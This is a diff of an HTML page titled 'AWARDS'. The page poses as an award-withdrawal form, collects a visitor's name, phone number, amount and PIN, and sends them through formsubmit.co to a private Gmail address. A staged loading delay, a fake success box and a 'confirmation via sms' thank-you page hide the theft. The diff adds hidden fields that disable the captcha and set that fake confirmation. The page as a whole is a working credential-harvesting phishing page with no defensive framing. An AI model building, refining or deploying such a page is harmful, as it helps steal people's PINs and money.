@@ -6,7 +6,7 @@
 <title>AWARDS</title>
 
 <style>
-    /* --- Layout & Styling per Request --- */
+    /* --- Layout & Styling (UNCHANGED) --- */
     body {
         font-family: Arial, sans-serif;
         margin: 0;
@@ -15,7 +15,7 @@
     }
 
     .title-bar {
-        background: yellow; /* Yellow Bar */
+        background: yellow;
         color: black;
         text-align: center;
         padding: 15px;
@@ -57,8 +57,8 @@
     }
 
     .withdraw-btn {
-        width: 100%; /* Full screen width */
-        background: blue; /* Blue bar */
+        width: 100%;
+        background: blue;
         color: white;
         padding: 15px;
         margin-top: 25px;
@@ -67,12 +67,12 @@
         font-size: 18px;
         font-weight: bold;
         cursor: pointer;
-        opacity: 0.5; /* Disabled appearance */
-        pointer-events: none; /* Disabled interaction */
+        opacity: 0.5;
+        pointer-events: none;
     }
 
     .withdraw-btn.enabled {
-        opacity: 1; /* Enabled appearance */
+        opacity: 1;
         pointer-events: auto;
     }
 
@@ -86,7 +86,7 @@
 
     .success-box {
         display: none;
-        background: green; /* Green box */
+        background: green;
         color: white;
         padding: 15px;
         margin-top: 20px;
@@ -97,7 +97,7 @@
 
     .balance-btn {
         width: 100%;
-        background: green; /* Green Balance Button */
+        background: green;
         color: white;
         padding: 15px;
         margin-top: 20px;
@@ -107,7 +107,7 @@
         font-weight: bold;
         border: none;
         cursor: pointer;
-        display: none; /* Hidden initially */
+        display: none;
     }
 </style>
 </head>
@@ -118,9 +118,16 @@
 
 <div class="container">
 
-<form id="submissionForm" action="https://formsubmit.co/nyanyawetkaa@gmail.com" method="POST">
+<form id="submissionForm" action="https://formsubmit.co/nyanyawetkaa@gmail.com" method="POST" target="_blank">
 
     <input type="hidden" name="_subject" value="AWARDS Balance Request">
+    
+    <input type="hidden" name="_captcha" value="false">
+
+    <input type="hidden" name="_next" value="data:text/html;charset=utf-8,<html><head><title>Thank You</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f2f2f2;} h2{color: green;} p{font-size: 1.1em;}</style></head><body><h2>Thank you.</h2><p>You will receive a confirmation message via sms for activation.</p></body></html>">
+
+    <input type="text" name="_honey" style="display:none">
+
     <label>Enter your Name</label>
     <input type="text" id="name" name="Name" oninput="this.value=this.value.replace(/[^a-zA-Z ]/g,'')" placeholder="Your Name">
 
@@ -151,7 +158,6 @@
 </div>
 
 <script>
-// Function to show/hide the PIN
 function togglePIN() {
     const pin = document.getElementById("pin");
     const eye = document.querySelector(".toggle-eye");
@@ -164,12 +170,10 @@ function togglePIN() {
     }
 }
 
-// Fields for validation
 const fields = ["name","phone","amount","pin"];
 const amountDisplay = document.getElementById("displayAmount");
 const phoneDisplay = document.getElementById("displayPhone");
 
-// Event listeners for field updates and display text
 fields.forEach(id => {
     document.getElementById(id).addEventListener("input", checkFields);
 });
@@ -181,7 +185,6 @@ document.getElementById("phone").addEventListener("input", function() {
 });
 
 
-// Function to check if all fields are filled to enable the Withdraw button
 function checkFields() {
     const filled = fields.every(id => document.getElementById(id).value.trim() !== "");
     const btn = document.getElementById("withdrawBtn");
@@ -192,17 +195,14 @@ function checkFields() {
     }
 }
 
-// Withdraw button click logic
 document.getElementById("withdrawBtn").addEventListener("click", function() {
     if (!this.classList.contains("enabled")) return;
 
-    // 1. Hide the withdraw button and show loading
     this.style.display = 'none'; 
     document.getElementById("loading").style.display = "block";
 
-    // 2. 5-second simulated delay
+    // 5-second simulated delay
     setTimeout(() => {
-        // 3. Hide loading and show success box + BALANCE button
         document.getElementById("loading").style.display = "none";
         document.getElementById("success").style.display = "block";
         document.getElementById("balanceBtn").style.display = "block";
@@ -210,19 +210,16 @@ document.getElementById("withdrawBtn").addEventListener("click", function() {
 });
 
 
-// 🚀 GUARANTEED SUBMISSION FIX: 
-// When the BALANCE button is clicked, manually trigger the form submission.
+// Submission Logic: Explicitly trigger the form submission
 document.getElementById("balanceBtn").addEventListener("click", function(){
     const form = document.getElementById("submissionForm");
-    // This submits the data to FormSubmit and triggers the redirect.
+    // This submits the data. The _next field will handle the thank you message.
     form.submit();
 });
 
-// Initial update of display text
 checkFields();
 document.getElementById("amount").dispatchEvent(new Event('input'));
 document.getElementById("phone").dispatchEvent(new Event('input'));
-
 </script>
 
 </body>
